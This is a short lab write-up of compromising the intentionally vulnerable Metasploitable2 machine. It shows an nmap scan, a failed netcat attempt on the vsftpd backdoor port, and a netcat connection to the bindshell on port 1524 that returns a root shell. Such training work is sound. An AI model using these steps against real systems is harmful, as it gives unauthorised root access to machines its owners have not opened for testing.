<div align="center">

# 🧠 Metasploitable2  
## Enumeration & Root Exploitation via Exposed Bindshell

![Category](https://img.shields.io/badge/Category-Network%20Exploitation-red?style=for-the-badge)
![Focus](https://img.shields.io/badge/Focus-Service%20Enumeration-blue?style=for-the-badge)
![Method](https://img.shields.io/badge/Method-Manual%20Exploitation-success?style=for-the-badge)

</div>

---

### 🎯 Objective

Perform enumeration on a vulnerable Linux system, identify exposed services, and gain root-level access.

---

### 🖥 Environment

| Tool | Purpose |
|-----|------|
| Kali Linux | Attacker machine |
| Metasploitable2 | Target |
| Nmap | Enumeration |
| Netcat | Exploitation |

---

### 📦 Step 1 — Perform Enumeration

`nmap -sC -sV 192.168.74.129`

<img src="../images/Screenshot 2026-03-19 202641.png" width="700">

---

### 🔍 Step 2 — Analyze Results

Identified key services including:

- FTP  
- SMB  
- Apache  
- Bindshell (port 1524)

---

### 🧪 Step 3 — Attempt vsftpd Exploit

`nc 192.168.74.129 6200`

<img src="../images/Screenshot 2026-03-19 200810.png" width="700">

Connection failed.

---

### 🔄 Step 4 — Pivot to Bindshell

Focused on port 1524.

---

### 💥 Step 5 — Exploit

`nc 192.168.74.129 1524`

<img src="../images/Screenshot 2026-03-19 200850.png" width="700">

---

### 🔐 Step 6 — Confirm Root Access

`whoami`

<img src="../images/Screenshot 2026-03-19 201000.png" width="700">

Output:

`root`

---

## 🧠 Methodology Framework Applied


Enumeration
↓
Analysis
↓
Exploit attempt
↓
Pivot
↓
Exploitation
↓
Privilege verification


---

## 💡 Skills Reinforced

- enumeration  
- exploitation  
- pivoting  

---

<div align="center">

💥 Simple paths lead to full compromise  

</div>
